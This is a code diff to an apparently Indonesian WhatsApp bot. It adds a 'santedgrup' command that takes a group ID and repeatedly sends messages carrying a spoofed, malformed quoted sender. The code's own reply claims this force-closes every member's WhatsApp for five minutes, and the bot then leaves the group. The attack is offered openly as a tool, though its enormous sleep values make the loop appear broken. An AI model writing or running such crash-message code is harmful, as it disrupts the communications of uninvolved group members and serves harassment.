@@ -629,6 +629,40 @@ case 'xentag':
                     })
 break
 
+case 'santedgrup': case 'santedgc':
+const seranggc = async(teks) => {await xinn.sendMessage(teks, {text: 'P'}, {quoted: {key: {fromMe: true, participant: `0@s.whatsapp.net`, ...({remoteJid: ""})}, message: {conversation: 'Powered By Xinn'}}})}
+if (!args[0]) return reply('Masukin id grupnya!')
+if (!args[0].includes('@g.us')) return reply('Masukkan id grup yang benar!')
+let gcmd = await xinn.groupMetadata(args[0]).catch(e => {})
+reply(`*〔 Berhasil Mengeksekusi Group 〕*\n
+*• Name Group :* ${gcmd.subject}
+*• Durasi :* 5 menit\n
+_Aplikasi WhatsApp Peserta Group Tersebut Akan Force Close(Tidak Bisa di Buka) Selama 5 menit Dari sekarang_`)
+seranggc(args[0])
+await sleep(30000000000)
+seranggc(args[0])
+await sleep(30000000000)
+seranggc(args[0])
+await sleep(30000000000)
+seranggc(args[0])
+await sleep(30000000000)
+seranggc(args[0])
+await sleep(30000000000)
+seranggc(args[0])
+await sleep(30000000000)
+seranggc(args[0])
+await sleep(30000000000)
+seranggc(args[0])
+await sleep(30000000000)
+seranggc(args[0])
+await sleep(30000000000)
+seranggc(args[0])
+await sleep(30000000000)
+seranggc(args[0])
+xinn.groupLeave(args[0])
+reply(`Berhasil mengeksekusi Group ${gcmd.subject} Selama 5 menit`)
+break
+
 case 'xendok':{
 
 
